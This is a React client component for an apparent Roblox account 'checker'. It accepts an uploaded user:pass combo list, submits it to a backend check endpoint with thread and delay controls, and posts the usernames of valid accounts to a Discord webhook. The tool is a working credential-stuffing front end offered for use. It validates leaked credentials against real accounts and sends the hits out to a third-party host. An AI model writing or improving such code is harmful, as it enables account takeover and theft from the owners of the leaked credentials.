'use client';
import { useState } from 'react';

export default function Uploader({ onDone }: { onDone: (data: any) => void }) {
  const [text, setText] = useState('');
  const [threads, setThreads] = useState(1);
  const [delay, setDelay] = useState(3000);
  const [webhook, setWebhook] = useState('');
  const [loading, setLoading] = useState(false);

  const handleFile = (f: File) => {
    const reader = new FileReader();
    reader.onload = (e) => setText(String(e.target?.result || ''));
    reader.readAsText(f);
  };

  const start = async () => {
    if (!text.trim()) return;
    setLoading(true);
    try {
      const res = await fetch('/api/check', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ combo: text, threads, delay })
      });
      const data = await res.json();

      if (webhook && data.valid > 0) {
        const validList = data.results.filter((r: any) => r.status === 'valid').map((r: any) => r.username).join('\n');
        const embed = {
          embeds: [{
            title: 'Roblox Checker Report',
            color: 0x00ff00,
            fields: [
              { name: 'Total', value: String(data.total), inline: true },
              { name: 'Valid', value: String(data.valid), inline: true },
              { name: 'Invalid', value: String(data.invalid), inline: true },
              { name: 'Error', value: String(data.error), inline: true },
              { name: 'Rate', value: String(data.rate), inline: true },
              { name: 'Valid List', value: `\`\`\`\n${validList.slice(0, 1000)}\n\`\`\``, inline: false }
            ],
            footer: { text: 'Liberty Hollow Checker' },
            timestamp: new Date().toISOString()
          }]
        };
        try {
          await fetch(webhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(embed)
          });
        } catch {}
      }

      onDone(data);
    } catch {
      onDone({ total: 0, valid: 0, invalid: 0, error: 1, rate: 0, results: [] });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="space-y-4">
      <div
        onDrop={(e) => { e.preventDefault(); handleFile(e.dataTransfer.files[0]); }}
        onDragOver={(e) => e.preventDefault()}
        className="border-2 border-dashed border-white/10 rounded-2xl p-8 text-center hover:border-white/20 transition"
      >
        <input id="f" type="file" accept=".txt" hidden onChange={(e) => e.target.files && handleFile(e.target.files[0])} />
        <label htmlFor="f" className="cursor-pointer block">
          <div className="text-4xl mb-2">📁</div>
          <div className="font-semibold">Click to upload or drag & drop .txt</div>
          <div className="text-sm text-white/40 mt-1">user:pass — one per line</div>
          {text && <div className="text-xs text-green-400 mt-3">{text.split('\n').filter(Boolean).length} lines loaded</div>}
        </label>
      </div>
      <div className="grid grid-cols-2 gap-3">
        <select value={threads} onChange={(e) => setThreads(+e.target.value)} className="bg-black/40 border border-white/10 rounded-lg p-3 text-white">
          {[1,2,3,5,10].map(n => <option key={n} value={n}>{n} Threads</option>)}
        </select>
        <select value={delay} onChange={(e) => setDelay(+e.target.value)} className="bg-black/40 border border-white/10 rounded-lg p-3 text-white">
          {[1000,2000,3000,5000,10000].map(n => <option key={n} value={n}>{n/1000}s</option>)}
        </select>
      </div>
      <input placeholder="Discord Webhook URL" value={webhook} onChange={(e) => setWebhook(e.target.value)}
        className="w-full bg-black/40 border border-white/10 rounded-lg p-3 text-white placeholder-white/30" />
      <button onClick={start} disabled={loading || !text.trim()}
        className="w-full bg-white text-black font-semibold py-3 rounded-lg disabled:opacity-40 hover:bg-white/90 transition">
        {loading ? 'Checking...' : '▶ Start Check'}
      </button>
    </div>
  );
}
